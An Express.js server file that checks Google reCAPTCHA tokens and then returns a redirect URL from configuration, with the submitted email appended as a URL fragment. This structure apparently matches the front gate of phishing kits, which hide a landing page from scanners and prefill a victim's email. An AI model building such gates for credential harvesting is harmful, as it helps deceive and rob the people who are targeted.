import express from 'express';
import axios from 'axios';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import morgan from 'morgan';
import { setDefaultResultOrder } from 'dns';

// =====================
// CRITICAL RAILWAY FIXES (VPN COMPATIBILITY)
// =====================
setDefaultResultOrder('ipv4first');

const app = express();
const PORT = process.env.PORT || 8080;

// =====================
// MIDDLEWARE
// =====================
app.set('trust proxy', 1); 

app.use(cors({
  origin: process.env.FRONTEND_URL || '*',
  credentials: true
}));

app.use(express.json());
app.use(morgan('combined'));

// Relaxed rate limiting for shared VPN IPs
app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 200,
  standardHeaders: true,
  legacyHeaders: false,
  skip: (req) => req.path === '/health'
}));

// =====================
// ROUTES
// =====================
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'ready',
    timestamp: new Date().toISOString(),
    ipMode: 'ipv4-first'
  });
});

app.post('/verify-token', async (req, res) => {
  const { token, email } = req.body; 
  const secret = process.env.RECAPTCHA_SECRET;

  if (typeof token !== 'string' || token.length < 10) {
    return res.status(400).json({ success: false, reason: 'Invalid request' });
  }

  if (!secret) {
    return res.status(500).json({ success: false, reason: 'Server configuration error' });
  }

  try {
    const response = await axios.post(
      'https://www.google.com/recaptcha/api/siteverify',
      new URLSearchParams({ secret, response: token }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        timeout: 10000 // 10 second timeout to handle VPN latency without failing
      }
    );

    const { success, score, 'error-codes': errors = [] } = response.data;

    if (!success) {
      return res.status(403).json({
        success: false,
        reason: 'Verification failed'
      });
    }

    // SAFE THRESHOLD: 0.3. Allows humans on VPNs but blocks obvious bots.
    if (score < 0.3) {
      return res.status(403).json({
        success: false,
        reason: 'Verification failed. Try Again'
      });
    }

    let redirectUrl = process.env.REDIRECT_URL || 'https://default-redirect.com';
    if (email) {
      redirectUrl = `${redirectUrl.replace(/#.*$/, '')}#${email}`;
    }

    return res.json({
      success: true,
      redirect: redirectUrl
    });

  } catch (err) {
    console.error('reCAPTCHA API Error:', err.message);
    return res.status(502).json({
      success: false,
      reason: 'Verification service unavailable'
    });
  }
});

const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on http://0.0.0.0:${PORT}`);
});

server.keepAliveTimeout = 60000;
server.headersTimeout = 65000;
